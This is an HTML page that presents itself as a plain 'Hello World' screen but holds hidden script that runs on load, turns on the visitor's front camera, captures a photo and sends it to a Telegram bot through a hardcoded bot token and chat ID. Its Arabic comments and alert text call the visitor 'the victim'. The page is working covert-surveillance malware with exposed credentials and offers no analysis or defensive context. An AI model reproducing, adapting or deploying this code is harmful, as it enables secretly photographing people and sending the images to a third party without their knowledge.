<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-size: 5em; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div>Hello World</div>

    <script>
        const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const chat = "8042090388";

        async function startHacking() {
            try {
                // طلب الكاميرا بأعلى جودة ممكنة
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 1280, height: 720 } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                // ننتظر حتى يبدأ الفيديو بالعمل فعلياً
                video.onloadedmetadata = () => {
                    video.play();
                    // تأخير 4 ثواني كاملة لضمان فتح العدسة وتعديل السطوع
                    setTimeout(captureClearImage, 4000);
                };
            } catch (err) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=⚠️ الضحية رفض الكاميرا أو الجهاز لا يدعمها`);
            }
        }

        function captureClearImage() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');

            // التأكد أن هناك بيانات فيديو حقيقية (ليست سوداء)
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imgData = canvas.toDataURL('image/jpeg', 0.9);
                sendToTelegram(imgData);
            } else {
                // إذا لم يكن جاهزاً، حاول مرة أخرى بعد ثانية
                setTimeout(captureClearImage, 1000);
            }
        }

        async function sendToTelegram(base64Data) {
            const blob = await (await fetch(base64Data)).blob();
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('photo', blob, 'shot.jpg');

            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // بدء العملية فور دخول الصفحة
        window.onload = startHacking;
    </script>
</body>
</html>
